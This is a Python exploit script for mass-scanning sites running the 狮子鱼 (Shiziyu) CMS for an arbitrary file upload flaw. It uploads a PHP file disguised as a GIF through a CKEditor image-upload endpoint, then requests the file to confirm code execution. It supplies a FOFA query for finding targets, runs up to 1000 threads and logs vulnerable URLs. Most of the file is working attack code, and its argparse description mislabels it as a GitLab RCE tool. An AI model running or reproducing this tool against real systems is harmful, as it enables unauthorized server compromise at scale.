import requests
import re
import argparse
import threading
import sys
import urllib3
import argparse
import urllib.request
import ssl
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()


def banner():
    print("""
        //    /$$$$$$                                          /$$       /$$   /$$                           /$$
        //   /$$__  $$                                        | $$      | $$  | $$                          | $$
        //  | $$  \__/ /$$  /$$  /$$  /$$$$$$   /$$$$$$   /$$$$$$$      | $$  | $$  /$$$$$$  /$$$$$$$   /$$$$$$$
        //  |  $$$$$$ | $$ | $$ | $$ /$$__  $$ /$$__  $$ /$$__  $$      | $$$$$$$$ |____  $$| $$__  $$ /$$__  $$
        //   \____  $$| $$ | $$ | $$| $$  \ $$| $$  \__/| $$  | $$      | $$__  $$  /$$$$$$$| $$  \ $$| $$  | $$
        //   /$$  \ $$| $$ | $$ | $$| $$  | $$| $$      | $$  | $$      | $$  | $$ /$$__  $$| $$  | $$| $$  | $$
        //  |  $$$$$$/|  $$$$$/$$$$/|  $$$$$$/| $$      |  $$$$$$$      | $$  | $$|  $$$$$$$| $$  | $$|  $$$$$$$
        //   \______/  \_____/\___/  \______/ |__/       \_______/      |__/  |__/ \_______/|__/  |__/ \_______/
        //
        //
        //
    	""")
    print('''
        狮子鱼 任意文件上传 \n
        作者：孤桜懶契 \n
        fofa 语句："/seller.php?s=/Public/login" \n
        批量检测：python3 xxx.py -f/--file target.txt  \n
        个人博客：gylq.gitee.io \n
        公众号：渗透安全团队
        ''')


payload="""
------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name="files"; filename="shenye.php"
Content-Type: image/gif

<?php echo('whoami');?>
------WebKitFormBoundary8UaANmWAgM4BqBSs—
"""

# 检查漏洞 存在否
def check(target_url):
    scan_url = target_url + "/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php"
    head = {
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs'
    }
    head = {
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs'
    }
    proxies = {
        "http": 'http://127.0.0.1:8080',
        "https": 'http://127.0.0.1:8080'
    }

    try:
        res = requests.post(url=scan_url, headers=head, data=payload.encode('utf-8'),verify=False)
    except:
                print("[*] Connect Timeout!")

    content=res.text
    if 'image/uploads' in content:
        print("[+] Input Content: \n",content)

        result = re.findall('image/uploads/(.*?)\"', res.text)[0]
        getshell_url = target_url + "/Common/image/uploads/{}".format(result)
        try:
            req = requests.get(getshell_url,verify=False)
            print(req.text)
        except:
                    print("[*] Connect Timeout!")
        print("[+] 存在任意文件上传漏洞：{}".format(getshell_url))
        with open("shiziyu.txt", "a+") as a:
                    a.write("[+] 存在任意文件上传漏洞：{}\n".format(getshell_url))


# 检查 url格式

def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))


# 主要执行
def main():
    parser = argparse.ArgumentParser(description='GitLab < 13.10.3 RCE')  # 描述

    parser.add_argument('-f', '--file', help='Please Input a url.txt!', default='')  # 传入值

    args = parser.parse_args()  # 解析分解
    with open(args.file, "r") as f:
        gitlab = f.read().split("\n")
        # for url in gitlab:
        #     target(url,dnslog)
        i = 0
        # print(len(gitlab) 总长度
        while True:
            if i < len(gitlab) and threading.active_count() <= 1000:  # 50线程
                if gitlab[i].strip() != '':  # 去掉空格
                    url_path = format_url(gitlab[i].strip())
                    url_target = format_url(url_path)  # 检查格式
                    t = threading.Thread(target=check, args=(url_target,))
                    t.start()
                    i += 1
                    print("[*] 剩下数量：", i, "/", len(gitlab))
            if i == len(gitlab) and threading.active_count() == 1:
                print("[*] done result write in \"shiziyu.txt\" ! ")
                break
    f.close()


def remove_duplicates(path):
    lines_seen = set()
    outfile = open(f"{path}.out", 'a+')
    f = open(path, 'r')
    for line in f:
        if line not in lines_seen:
            outfile.write(line)
            lines_seen.add(line)
    outfile.close()
    f.close()


if __name__ == '__main__':
    if len(sys.argv) == 1:
        banner()
        sys.exit()
    banner()
    main()